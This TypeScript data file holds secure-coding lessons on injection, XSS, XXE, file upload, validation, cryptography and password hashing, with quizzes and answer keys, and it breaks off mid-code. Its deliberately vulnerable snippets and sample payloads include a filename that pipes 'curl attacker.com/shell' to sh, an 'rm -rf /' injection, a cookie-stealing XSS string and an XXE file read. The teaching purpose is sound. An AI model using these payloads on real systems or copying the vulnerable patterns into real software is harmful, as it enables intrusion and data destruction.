import { LearningSet } from '../types/curriculum';

export const SETS_CHAPTER_7_9: LearningSet[] = [
  // CHAPTER 7
  {
    id: '7.1',
    chapterId: 7,
    setIndex: 1,
    title: 'Injection flaws: SQLi, NoSQLi, OS command, and LDAP injection',
    summary: 'Master the root cause of injection attacks across SQL, NoSQL ($ne/$regex), OS command exec, and LDAP directories.',
    domain: 'vulnerabilities',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-89: SQL Injection / CWE-78: OS Command Injection',
    owaspTop10: 'A03:2021-Injection',
    concepts: [
      {
        title: 'The Universal Theory of Injection',
        content: 'Injection occurs when untrusted user data is concatenated directly into an interpreter string (SQL, bash shell, MongoDB BSON, LDAP query), tricking the interpreter into executing the data as control syntax. The definitive remediation across all injection classes is strict separation of code and data: parameterized queries, prepared statements, and parameterized process invocation APIs.',
        keyPrinciple: 'Never concatenate untrusted input into interpreter syntax. Keep instructions and data completely separated.',
      },
      {
        title: 'NoSQL & OS Command Injection Nuances',
        content: 'NoSQL injection exploits object parameters (e.g. { "username": "admin", "password": { "$gt": "" } }) to bypass authentication without quotes. OS command injection occurs when shell strings (child_process.exec) pass user input directly into /bin/sh rather than using array arguments (child_process.execFile).',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'OS command injection via shell command string formatting user-controlled filename.',
      cweOrStandard: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
      impact: 'Full remote code execution and reverse shell on the host server.',
      realWorldScenario: 'An image resizing utility passed user filename into exec(`convert ${filename} -resize 100x100 out.png`); attackers passed "photo.png; curl attacker.com/shell | sh".',
    },
    codeAuditLab: {
      language: 'TypeScript / Node.js',
      title: 'OS Command Injection via exec() vs. execFile()',
      description: 'Audit a backup utility executing system commands with shell interpolation.',
      vulnerableCode: `// VULNERABLE: Direct shell interpolation allows command chaining with ; or |
import { exec } from 'child_process';

app.post('/api/backup/export', (req, res) => {
  const { filename } = req.body;
  // Catastrophic RCE: filename = "data.tar.gz; rm -rf /"
  exec(\`tar -czf /backups/\${filename} /var/data\`, (error, stdout) => {
    if (error) return res.status(500).json({ error: 'Backup failed' });
    res.json({ message: 'Backup created' });
  });
});`,
      remediatedCode: `// REMEDIATED: Uses execFile with argument array without invoking /bin/sh shell
import { execFile } from 'child_process';
import path from 'path';

app.post('/api/backup/export', (req, res) => {
  const { filename } = req.body;

  // 1. Strict allowlist validation: alphanumeric characters only
  if (!filename || !/^[a-zA-Z0-9_-]{3,50}\\.tar\\.gz$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename format. Must be alphanumeric .tar.gz' });
  }

  const safeFilename = path.basename(filename);
  const targetPath = path.join('/backups', safeFilename);

  // 2. execFile does NOT spawn a shell; arguments are passed directly to OS kernel execve()
  execFile('/bin/tar', ['-czf', targetPath, '/var/data'], (error) => {
    if (error) {
      logger.error({ error }, 'Secure backup process failed');
      return res.status(500).json({ error: 'Backup failed' });
    }
    res.json({ message: 'Backup created successfully', file: safeFilename });
  });
});`,
      flawExplanation: 'child_process.exec spawns a /bin/sh shell interpreter, allowing metacharacters (; | & ` $()) to execute arbitrary secondary commands.',
      fixExplanation: 'Replaces exec with execFile, passing arguments as a fixed array to execve() where metacharacters are treated purely as literal strings.',
    },
    quiz: {
      question: 'Why does passing arguments as an array to execFile() prevent OS command injection?',
      options: [
        'Because execFile encrypts the arguments with AES.',
        'Because execFile passes arguments directly to the OS kernel without invoking an intermediate command shell interpreter.',
        'Because execFile converts all arguments to base64.',
        'Because execFile only runs on Windows systems.',
      ],
      correctAnswer: 1,
      explanation: 'Without a shell (/bin/sh) to parse the string, shell metacharacters like ;, &, |, and ` have no special syntax meaning and cannot chain commands.',
    },
    defenseChecklist: [
      'Use parameterized queries / prepared statements for 100% of database queries.',
      'Never use child_process.exec() or system(); use execFile() with discrete argument arrays.',
      'Sanitize and validate NoSQL inputs using strict object schema validators (Zod/Joi).',
      'Escape user input before passing into LDAP search filter templates using RFC 4515 encoders.',
    ],
  },
  {
    id: '7.2',
    chapterId: 7,
    setIndex: 2,
    title: 'Cross-site scripting (XSS) and output encoding',
    summary: 'Defeat Reflected, Stored, and DOM-based XSS using context-aware encoding and modern UI frameworks.',
    domain: 'vulnerabilities',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation (\'Cross-site Scripting\')',
    owaspTop10: 'A03:2021-Injection',
    concepts: [
      {
        title: 'The Three Flavors of XSS',
        content: 'Stored XSS: Malicious payload is permanently saved in the database and served to unsuspecting viewers. Reflected XSS: Payload in request parameters is echoed immediately in the server response. DOM-based XSS: Client-side JavaScript reads untrusted data from an execution sink (e.g., location.hash, eval, innerHTML) and injects it into the DOM.',
        keyPrinciple: 'Encoding must match the exact output context: HTML body, HTML attribute, JavaScript variable, URL parameter, or CSS.',
      },
      {
        title: 'Modern Framework Defenses & DOMPurify',
        content: 'Modern frameworks like React and Angular auto-encode variables by default. However, escape hatches like dangerouslySetInnerHTML, v-html, and direct element.innerHTML re-open severe DOM XSS vectors unless sanitized by DOMPurify.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Stored XSS in user profile biography executing malicious JavaScript when other users view profile.',
      cweOrStandard: 'CWE-79: Cross-site Scripting (Stored XSS)',
      impact: 'Session token theft, keylogging of passwords, and malicious CSRF actions on behalf of victims.',
      realWorldScenario: 'Samy Worm on MySpace used stored XSS in user profiles to add 1 million friends in 20 hours.',
    },
    codeAuditLab: {
      language: 'TypeScript / React',
      title: 'DOM XSS via dangerouslySetInnerHTML',
      description: 'Audit a comment rendering component that bypasses React’s built-in XSS protections.',
      vulnerableCode: `// VULNERABLE: Direct insertion of raw user HTML enables arbitrary Stored / DOM XSS
export function UserComment({ commentHtml }: { commentHtml: string }) {
  // FLAW: An attacker injecting <img src=x onerror="alert(document.cookie)"> executes JS!
  return (
    <div className="comment-box">
      <div dangerouslySetInnerHTML={{ __html: commentHtml }} />
    </div>
  );
}`,
      remediatedCode: `// REMEDIATED: Sanitizes with DOMPurify and strictly restricts allowed HTML tags
import DOMPurify from 'dompurify';

export function UserComment({ commentHtml }: { commentHtml: string }) {
  // Configure strict allowlist of benign formatting tags only
  const cleanHtml = DOMPurify.sanitize(commentHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'code'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false
  });

  return (
    <div className="comment-box">
      <div 
        dangerouslySetInnerHTML={{ __html: cleanHtml }}
        // Ensure outbound links cannot access window.opener
        className="prose text-slate-200" 
      />
    </div>
  );
}`,
      flawExplanation: 'dangerouslySetInnerHTML tells React to bypass its automatic HTML escaping, allowing raw script tags and inline event handlers to execute.',
      fixExplanation: 'Cleanses the input through DOMPurify with a strict allowlist of benign tags and attributes, neutralizing all XSS execution vectors.',
    },
    quiz: {
      question: 'Why does HTML body encoding (e.g. converting < to &lt;) fail to prevent XSS if user input is reflected inside an inline href="javascript:..." attribute?',
      options: [
        'Because HTML entity encoding is ignored inside javascript: pseudo-protocol URIs where browsers decode and execute the JavaScript.',
        'Because browsers convert &lt; to executable binary.',
        'Because href attributes do not support encoding.',
        'Because XSS only works in script tags.',
      ],
      correctAnswer: 0,
      explanation: 'Different HTML contexts require different encoding strategies; a URL context requires validating the protocol (http/https only) to block javascript: schemes.',
    },
    defenseChecklist: [
      'Rely on framework auto-escaping in React/Vue/Angular; avoid dangerouslySetInnerHTML.',
      'Sanitize unavoidable rich-text HTML inputs using DOMPurify with strict tag allowlists.',
      'Enforce a strict Content Security Policy (CSP) blocking inline scripts (script-src \'self\').',
      'Validate that all user-supplied links start with http:// or https://, blocking javascript: and data: URIs.',
    ],
  },
  {
    id: '7.3',
    chapterId: 7,
    setIndex: 3,
    title: 'Insecure deserialization, XXE, and XML security',
    summary: 'Harden applications against XML External Entity (XXE) attacks, Billion Laughs DoS, and object deserialization RCE.',
    domain: 'vulnerabilities',
    duration: '22 min',
    difficulty: 'Advanced',
    cwe: 'CWE-502: Deserialization of Untrusted Data / CWE-611: XXE',
    owaspTop10: 'A08:2021-Software and Data Integrity Failures',
    concepts: [
      {
        title: 'XML External Entity (XXE) Mechanics',
        content: 'XML allows Document Type Definitions (DTDs) to declare external entities referencing file URLs (e.g. <!ENTITY xxe SYSTEM "file:///etc/passwd">). When a vulnerable parser resolves external entities, attackers can read arbitrary server files, launch SSRF attacks against internal clouds, or trigger quadratic entity expansion (Billion Laughs DoS).',
        keyPrinciple: 'Disable DTDs (Document Type Definitions) and external entity resolution completely on all XML parsers.',
      },
      {
        title: 'Insecure Deserialization Hazards',
        content: 'Deserializing untrusted serialized language objects (Java serialized objects, Python pickle, PHP unserialize, Node.js serialize-javascript) allows attackers to instantiate gadget chains that lead to Remote Code Execution.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker uploads XML invoice with external entity reference extracting AWS credentials or /etc/passwd.',
      cweOrStandard: 'CWE-611: Improper Restriction of XML External Entity Reference (\'XXE\')',
      impact: 'Confidential file exfiltration, cloud metadata SSRF, and server denial of service.',
      realWorldScenario: 'A major payment gateway accepted SAML assertions without disabling external entity resolution, allowing researchers to read /etc/shadow.',
    },
    codeAuditLab: {
      language: 'Java / XML Parser',
      title: 'XML External Entity (XXE) Resolution',
      description: 'Audit a Java DocumentBuilderFactory parser configured with default vulnerable entity resolution.',
      vulnerableCode: `// VULNERABLE: Default parser configuration resolves external entities and DTDs
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// FLAW: Default settings permit DOCTYPE and external SYSTEM entities!
DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(userXmlInputStream);`,
      remediatedCode: `// REMEDIATED: Secure parser configuration disabling DTDs and external entities
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.XMLConstants;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// 1. Completely disable Document Type Definitions (DTDs)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// 2. Disable external parameter entities and general entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// 3. Prevent entity expansion attacks (Billion Laughs)
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(userXmlInputStream);`,
      flawExplanation: 'Standard XML parsers by default resolve external entity references, allowing attackers to define SYSTEM entities pointing to local files.',
      fixExplanation: 'Explicitly disables DTDs and external entity loading features, and enables XMLConstants.FEATURE_SECURE_PROCESSING.',
    },
    quiz: {
      question: 'What is the most effective single setting to completely neutralize XML External Entity (XXE) vulnerabilities in an XML parser?',
      options: [
        'Encoding the incoming XML payload with Base64.',
        'Completely disabling Document Type Definitions (DTDs / disallow-doctype-decl).',
        'Filtering the word "SYSTEM" from the XML string with regex.',
        'Converting XML to YAML before parsing.',
      ],
      correctAnswer: 1,
      explanation: 'Disabling DTDs (disallow-doctype-decl: true) prevents the parser from declaring or processing entities altogether, eliminating XXE.',
    },
    defenseChecklist: [
      'Disable DOCTYPE declarations (disallow-doctype-decl) across all XML parsers.',
      'Enable FEATURE_SECURE_PROCESSING on XML and DOM processors.',
      'Never use Python pickle, Java ObjectInputStream, or PHP unserialize for untrusted client data.',
      'Prefer pure JSON or Protocol Buffers over complex object serialization formats.',
    ],
  },
  {
    id: '7.4',
    chapterId: 7,
    setIndex: 4,
    title: 'File upload, path traversal, and content-type validation',
    summary: 'Secure file upload endpoints against path traversal (../), dangerous executable extensions, and MIME spoofing.',
    domain: 'vulnerabilities',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-22: Path Traversal / CWE-434: Unrestricted File Upload',
    owaspTop10: 'A03:2021-Injection',
    concepts: [
      {
        title: 'Path Traversal Mechanics (Directory Traversal)',
        content: 'Path traversal occurs when an application uses user-supplied filenames directly in filesystem path operations without canonicalization. Attackers inject dot-dot-slash sequences (e.g. ../../../etc/passwd or %2e%2e%2f) to step outside the intended upload root directory.',
        keyPrinciple: 'Never trust user-supplied filenames. Discard the original name and generate a cryptographically random UUID on disk.',
      },
      {
        title: 'Multi-Layered File Upload Security',
        content: 'A comprehensive upload pipeline enforces: 1. Max file size limits. 2. Strict extension allowlists (.jpg, .png, .pdf only—never check Content-Type header alone since clients control it). 3. Magic byte signature verification. 4. Storage outside the web root (e.g., S3/Cloud Storage). 5. Malware scanning via ClamAV.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker uploads avatar named ../../../var/www/shell.php to achieve arbitrary web shell RCE.',
      cweOrStandard: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory (\'Path Traversal\')',
      impact: 'Remote code execution via executable script upload into web-accessible root.',
      realWorldScenario: 'An application allowed users to upload company logos with raw filename parameters; attackers uploaded avatar.php to the public root and executed shell commands.',
    },
    codeAuditLab: {
      language: 'TypeScript / Node.js',
      title: 'Path Traversal & Unvalidated File Upload',
      description: 'Audit an avatar upload handler that concatenates raw filenames and trusts the client Content-Type.',
      vulnerableCode: `// VULNERABLE: Uses client filename directly; susceptible to ../ path traversal and .php upload
app.post('/api/upload/avatar', upload.single('avatar'), (req, res) => {
  const originalName = req.file.originalname; // e.g., "../../../shell.php"
  const targetPath = path.join(__dirname, 'public/uploads', originalName);

  // Directly writes untrusted file path to disk in publicly executable directory
  fs.writeFileSync(targetPath, req.file.buffer);
  res.json({ url: \`/uploads/\${originalName}\` });
});`,
      remediatedCode: `// REMEDIATED: Random UUID filename, magic byte check, and path boundary enforcement
import crypto from 'crypto';
import path from 'path';
import fileType from 'file-type';

const ALLOWED_MIME_TYPES = new Set(['image/jpeg', 'image/png', 'image/webp']);
const UPLOAD_ROOT = path.resolve('/var/app/storage/uploads');

app.post('/api/upload/avatar', upload.single('avatar'), async (req, res) => {
  if (!req.file || req.file.size > 5 * 1024 * 1024) {
    return res.status(400).json({ error: 'File missing or exceeds 5MB limit' });
  }

  // 1. Inspect real magic bytes, ignoring spoofable client Content-Type header
  const detectedType = await fileType.fromBuffer(req.file.buffer);
  if (!detectedType || !ALLOWED_MIME_TYPES.has(detectedType.mime)) {
    return res.status(400).json({ error: 'Invalid file format. Only JPEG, PNG, WEBP allowed.' });
  }

  // 2. Discard user-supplied filename completely; generate unguessable UUID
  const safeFilename = \`\${crypto.randomUUID()}.\${detectedType.ext}\`;
  const destinationPath = path.resolve(UPLOAD_ROOT, safeFilename);

  // 3. Assert path stays strictly within intended upload root
  if (!destinationPath.startsWith(UPLOAD_ROOT)) {
    return res.status(403).json({ error: 'Directory traversal violation' });
  }

  // 4. Save to non-executable storage
  await fs.promises.writeFile(destinationPath, req.file.buffer, { mode: 0o600 });
  res.json({ id: safeFilename });
});`,
      flawExplanation: 'Trusting req.file.originalname allows directory traversal attacks to overwrite critical files, and allows uploading executable scripts (.php, .jsp, .exe).',
      fixExplanation: 'Discards original filenames in favor of random UUIDs, validates magic bytes, enforces path confinement, and stores files with non-executable permissions.',
    },
    quiz: {
      question: 'Why is checking the HTTP "Content-Type" header alone completely ineffective for file upload validation?',
      options: [
        'Because HTTP headers cannot exceed 100 bytes.',
        'Because the Content-Type header is supplied by the client and an attacker can easily send "image/png" while uploading a malicious PHP script.',
        'Because browsers encrypt the Content-Type header.',
        'Because web servers strip the Content-Type header automatically.',
      ],
      correctAnswer: 1,
      explanation: 'The Content-Type header is completely controlled by the client; adversaries can trivially spoof the header in curl or Burp Suite.',
    },
    defenseChecklist: [
      'Always discard user-supplied filenames and generate unique random UUIDs on disk.',
      'Inspect magic bytes (file signature) rather than relying on extension or Content-Type headers.',
      'Store uploaded files in object storage (S3/GCS) or outside the web server execution root.',
      'Serve uploaded files with Content-Disposition: attachment and X-Content-Type-Options: nosniff.',
    ],
  },
  {
    id: '7.5',
    chapterId: 7,
    setIndex: 5,
    title: 'Secure parsers, validation libraries, and allowlist strategies',
    summary: 'Implement robust input validation using schema libraries (Zod, Joi), canonicalization, and strict allowlists.',
    domain: 'vulnerabilities',
    duration: '20 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-20: Improper Input Validation',
    owaspTop10: 'A03:2021-Injection',
    concepts: [
      {
        title: 'Allowlist (Positive) vs. Blocklist (Negative) Validation',
        content: 'Blocklists attempt to enumerate all bad characters or keywords (e.g. blocking \'<script>\' or \'UNION SELECT\'). Blocklists always fail because attackers use alternate encodings (null bytes, unicode, capitalization, nested tags). Allowlisting (positive validation) defines strict, unambiguous acceptance schemas: type, length, format, regex, and allowable ranges.',
        keyPrinciple: 'Always validate using strict positive allowlists; reject everything that does not conform.',
      },
      {
        title: 'Input Canonicalization Order',
        content: 'Data must be decoded and canonicalized into its simplest, standard representation BEFORE running validation rules. If an application validates before decoding, encoded payloads (%252e%252e%252f) easily bypass filters.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker bypasses weak blocklist filter with double-URL encoding (%252e%252e%252f).',
      cweOrStandard: 'CWE-173: Improper Handling of Alternate Encoding',
      impact: 'Filter bypass leading to unauthorized system access.',
      realWorldScenario: 'A web app stripped \'<script>\' tags; attackers passed \'<scr<script>ipt>\', which transformed into \'<script>\' after single-pass blocklist removal.',
    },
    codeAuditLab: {
      language: 'TypeScript / Zod',
      title: 'Blocklist vs. Schema-Based Allowlist Validation',
      description: 'Audit an endpoint replacing weak blocklist regexes with strict Zod schema validation.',
      vulnerableCode: `// VULNERABLE: Weak blocklist check easily bypassed by capitalization or encodings
app.post('/api/users/profile', (req, res) => {
  const { username, age } = req.body;

  // Flawed blocklist: easily bypassed
  if (username && (username.includes('<script>') || username.includes("'"))) {
    return res.status(400).json({ error: 'Illegal characters detected' });
  }

  // Unvalidated age can be negative, string, or arbitrary object!
  updateProfile(username, age);
  res.json({ success: true });
});`,
      remediatedCode: `// REMEDIATED: Type-safe, boundary-enforced Zod schema allowlist
import { z } from 'zod';

const UserProfileSchema = z.object({
  username: z.string()
    .trim()
    .min(3, 'Username must be at least 3 characters')
    .max(30, 'Username cannot exceed 30 characters')
    .regex(/^[a-zA-Z0-9_]+$/, 'Username may only contain letters, numbers, and underscores'),
  age: z.number()
    .int('Age must be an integer')
    .min(13, 'Must be at least 13 years old')
    .max(120, 'Invalid age value')
}).strict(); // Rejects extra unmapped fields to prevent mass assignment

app.post('/api/users/profile', (req, res) => {
  const parseResult = UserProfileSchema.safeParse(req.body);

  if (!parseResult.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: parseResult.error.flatten().fieldErrors
    });
  }

  const { username, age } = parseResult.data;
  updateProfile(username, age);
  res.json({ success: true });
});`,
      flawExplanation: 'Blocklist strings (like includes("<script>")) fail against <SCRIPT>, <img onerror>, and do not validate types or bounds.',
      fixExplanation: 'Uses a strict Zod schema enforcing exact regex character sets, string length limits, numeric boundaries, and rejects unmapped parameters.',
    },
    quiz: {
      question: 'Why should input canonicalization always precede input validation?',
      options: [
        'To speed up network roundtrips.',
        'Because if validation happens before canonicalization, alternate or double-encoded characters can bypass the validation checks and then be decoded into dangerous payloads by downstream components.',
        'Because canonicalization automatically encrypts the database.',
        'Because JSON does not support UTF-8.',
      ],
      correctAnswer: 1,
      explanation: 'Canonicalization converts inputs into their canonical form first, ensuring validation rules evaluate the actual, real payload.',
    },
    defenseChecklist: [
      'Adopt schema validation libraries (Zod, Joi, Pydantic) on all API endpoints.',
      'Enforce .strict() on schemas to reject unrecognized fields and prevent mass assignment.',
      'Canonicalize inputs before applying validation routines.',
      'Reject unexpected inputs with clear HTTP 400 Bad Request error envelopes.',
    ],
  },

  // CHAPTER 8
  {
    id: '8.1',
    chapterId: 8,
    setIndex: 1,
    title: 'Symmetric and asymmetric cryptography fundamentals',
    summary: 'Apply modern cryptographic algorithms: AES-256-GCM, ChaCha20-Poly1305, Ed25519, and RSA-4096.',
    domain: 'cryptography',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm',
    owaspTop10: 'A02:2021-Cryptographic Failures',
    concepts: [
      {
        title: 'Symmetric vs. Asymmetric Cryptography',
        content: 'Symmetric cryptography uses the same secret key for encryption and decryption. Always use Authenticated Encryption with Associated Data (AEAD) ciphers like AES-256-GCM or ChaCha20-Poly1305, which provide both confidentiality and ciphertext integrity. Never use unauthenticated modes like AES-ECB (which leaks structural patterns) or AES-CBC without HMAC (vulnerable to padding oracle attacks).',
        keyPrinciple: 'Never invent custom cryptography. Always use modern AEAD ciphers with unique initialization vectors.',
      },
      {
        title: 'Asymmetric Cryptography & Digital Signatures',
        content: 'Asymmetric cryptography uses key pairs: public key for encryption or signature verification; private key for decryption or signing. Modern standards favor Edwards-curve Digital Signature Algorithm (Ed25519) and ECDSA over legacy RSA due to smaller keys, faster computation, and higher security margins.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker modifies encrypted database values without detection because AES-CBC was used without integrity authentication.',
      cweOrStandard: 'CWE-353: Missing Support for Integrity Check',
      impact: 'Ciphertext bit-flipping attacks modifying user bank balances or roles.',
      realWorldScenario: 'An application encrypted auth cookies with AES-CBC without MAC; an attacker performed bit-flipping attacks on the ciphertext to change "admin=0" to "admin=1".',
    },
    codeAuditLab: {
      language: 'TypeScript / Node.js Crypto',
      title: 'Insecure ECB Mode vs. Authenticated AES-256-GCM',
      description: 'Audit an encryption helper using unauthenticated ECB mode with fixed keys.',
      vulnerableCode: `// VULNERABLE: AES in ECB mode leaks structural patterns and provides zero integrity
import crypto from 'crypto';

function encryptSecret(plaintext: string, key: Buffer): Buffer {
  // ECB mode has no IV and encrypts identical blocks identically!
  const cipher = crypto.createCipheriv('aes-256-ecb', key, null);
  return Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
}`,
      remediatedCode: `// REMEDIATED: Authenticated Encryption with Associated Data (AEAD) using AES-256-GCM
import crypto from 'crypto';

interface EncryptedPayload {
  ciphertext: string;
  iv: string;
  authTag: string;
}

export function encryptSecret(plaintext: string, key: Buffer): EncryptedPayload {
  if (key.length !== 32) throw new Error('Key must be exactly 256 bits (32 bytes)');

  // 1. Generate unique 96-bit (12-byte) initialization vector per encryption
  const iv = crypto.randomBytes(12);

  // 2. Initialize AES-256-GCM AEAD cipher
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);

  // 3. Extract 128-bit authentication tag to guarantee integrity and authenticity
  const authTag = cipher.getAuthTag();

  return {
    ciphertext: ciphertext.toString('base64'),
    iv: iv.toString('base64'),
    authTag: authTag.toString('base64')
  };
}

export function decryptSecret(payload: EncryptedPayload, key: Buffer): string {
  const iv = Buffer.from(payload.iv, 'base64');
  const authTag = Buffer.from(payload.authTag, 'base64');
  const ciphertext = Buffer.from(payload.ciphertext, 'base64');

  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(authTag); // Will throw error if ciphertext was tampered with!

  return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString('utf8');
}`,
      flawExplanation: 'AES-ECB mode preserves plaintext patterns across blocks and lacks an initialization vector, while CBC lacks integrity verification.',
      fixExplanation: 'Adopts AES-256-GCM AEAD with a unique 12-byte random IV for every encryption and an authentication tag that detects any ciphertext tampering.',
    },
    quiz: {
      question: 'Why is Authenticated Encryption with Associated Data (AEAD, like AES-256-GCM) strictly superior to unauthenticated encryption modes like AES-CBC?',
      options: [
        'AEAD automatically compresses the data before encryption.',
        'AEAD mathematically guarantees both confidentiality and integrity, throwing an error if an attacker tampers with even a single bit of ciphertext.',
        'AEAD does not require any cryptographic keys.',
        'AEAD uses fewer CPU cycles than plaintext.',
      ],
      correctAnswer: 1,
      explanation: 'AEAD verifies that the ciphertext has not been modified or corrupted in transit via a cryptographic authentication tag, defeating bit-flipping attacks.',
    },
    defenseChecklist: [
      'Use AES-256-GCM or ChaCha20-Poly1305 for all symmetric data encryption.',
      'Always generate a fresh cryptographically random IV/nonce for every encryption operation.',
      'Ban AES-ECB, DES, 3DES, RC4, and MD5 across all codebases.',
      'Adopt Ed25519 or ECDSA (P-256/P-384) for high-performance asymmetric signatures.',
    ],
  },
  {
    id: '8.2',
    chapterId: 8,
    setIndex: 2,
    title: 'Hashing, salting, and secure password storage',
    summary: 'Analyze cryptographic hash properties, pre-image resistance, salting, and memory-hard Key Derivation Functions (KDFs).',
    domain: 'cryptography',
    duration: '20 min',
    difficulty: 'Fundamental',
    cwe: 'CWE-916: Insufficient Computational Effort in Hash',
    owaspTop10: 'A02:2021-Cryptographic Failures',
    concepts: [
      {
        title: 'Cryptographic Hash Function Properties',
        content: 'A secure cryptographic hash function (SHA-256, SHA-3, BLAKE3) satisfies three properties: 1. Pre-image resistance (computationally infeasible to find input x given hash h). 2. Second pre-image resistance. 3. Collision resistance (infeasible to find any two inputs with the same hash).',
        keyPrinciple: 'Fast hashes are ideal for verifying file integrity; memory-hard KDFs are mandatory for passwords.',
      },
      {
        title: 'Salts and Peppers in Password Security',
        content: 'A salt is a unique, publicly stored random value added to a password before hashing, defeating rainbow table lookups and ensuring two identical passwords yield distinct hashes. A pepper is a high-entropy secret stored outside the database (in an HSM or KMS) combined with the password before hashing.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker uses pre-computed rainbow tables to reverse millions of unsalted MD5 password hashes in minutes.',
      cweOrStandard: 'CWE-759: Use of a One-Way Hash without a Salt',
      impact: 'Mass exposure of user accounts across multiple third-party services.',
      realWorldScenario: 'The LinkedIn 2012 breach leaked 6.5 million unsalted SHA-1 hashes, leading to immediate crack rates exceeding 90%.',
    },
    codeAuditLab: {
      language: 'TypeScript / Node.js',
      title: 'Unsalted Legacy Hash vs. Salted Argon2id Key Derivation',
      description: 'Audit a legacy password verification routine using unsalted MD5.',
      vulnerableCode: `// VULNERABLE: Unsalted fast hash vulnerable to rainbow tables
import crypto from 'crypto';

function checkPassword(inputPass: string, storedHash: string): boolean {
  // Catastrophic: MD5 is broken, unsalted, and fast
  const computed = crypto.createHash('md5').update(inputPass).digest('hex');
  return computed === storedHash;
}`,
      remediatedCode: `// REMEDIATED: Modern salted Argon2id with constant-time verification
import argon2 from 'argon2';

export async function verifyUserPassword(inputPass: string, storedHash: string): Promise<boolean> {
  if (!inputPass || !storedHash) return false;

  try {
    // Argon2 verifies using the embedded unique salt and work factors in constant time
    const isValid = await argon2.verify(storedHash, inputPass);

    // Check if hash needs re-hashing with updated work factors
    if (isValid && argon2.needsRehash(storedHash, { memoryCost: 65536, timeCost: 3 })) {
      // Trigger background rehash with upgraded parameters
    }

    return isValid;
  } catch (err) {
    return false;
  }
}`,
      flawExplanation: 'MD5 is cryptographically broken; without unique salts, pre-computed rainbow tables reverse unsalted hashes in milliseconds.',
      fixExplanation: 'Adopts Argon2id with unique 16-byte random salts and tuned memory/time parameters, resistant to GPU attacks.',
    },
    quiz: {
      question: 'What primary threat does a unique cryptographic salt defeat when hashing passwords?',
      options: [
        'SQL injection attacks.',
        'Pre-computed rainbow table lookups and identical hash collisions across users with the same password.',
        'Cross-site request forgery.',
        'Buffer overflow vulnerabilities.',
      ],
      correctAnswer: 1,
      explanation: 'Salts guarantee that identical passwords result in completely different hashes, neutralizing pre-computed rainbow tables.',
    },
    defenseChecklist: [
      'Generate a unique cryptographically random salt (at least 16 bytes) for every user password.',
      'Use memory-hard algorithms: Argon2id (preferred), scrypt, or bcrypt.',
      'Configure auto-rehashing when work factors or algorithm recommendations increase.',
      'Use constant-time comparison (crypto.timingSafeEqual) for all HMAC and token checks.',
    ],
  },
  {
    id: '8.3',
    chapterId: 8,
    setIndex: 3,
    title: 'TLS/SSL, certificates, and secure transport',
    summary: 'Configure TLS 1.3, perfect forward secrecy (PFS), HSTS, and PKI certificate validation.',
    domain: 'cryptography',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information',
    owaspTop10: 'A02:2021-Cryptographic Failures',
    concepts: [
      {
        title: 'TLS 1.3 & Perfect Forward Secrecy (PFS)',
        content: 'TLS 1.3 eliminates obsolete, vulnerable ciphers (RC4, DES, CBC, static RSA key exchange) and speeds up handshakes to 1-RTT. Perfect Forward Secrecy (using Ephemeral Diffie-Hellman / ECDHE) ensures that even if a server’s private long-term key is compromised in the future, past recorded encrypted traffic cannot be decrypted.',
        keyPrinciple: 'Enforce TLS 1.3 or modern TLS 1.2; disable all legacy TLS 1.0 and 1.1 protocols.',
      },
      {
        title: 'HSTS (HTTP Strict Transport Security)',
        content: 'HSTS (Strict-Transport-Security: max-age=63072000; includeSubDomains; preload) forces browsers to always connect via HTTPS, preventing SSL stripping attacks (like Moxie Marlinspike’s sslstrip) and disabling user override of certificate warnings.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker executes SSL stripping attack on public Wi-Fi because site omits HSTS header.',
      cweOrStandard: 'CWE-319: Cleartext Transmission of Sensitive Information',
      impact: 'Plaintext harvesting of user passwords and session cookies.',
      realWorldScenario: 'A banking application had HTTPS enabled but failed to send HSTS; a rogue Wi-Fi AP stripped HTTPS to HTTP port 80, intercepting user credentials.',
    },
    codeAuditLab: {
      language: 'TypeScript / Express Security Headers',
      title: 'Missing HSTS & Insecure Transport Configuration',
      description: 'Audit transport configuration omitting HTTP Strict Transport Security.',
      vulnerableCode: `// VULNERABLE: Omits HSTS header; permits downgrade to HTTP
app.use((req, res, next) => {
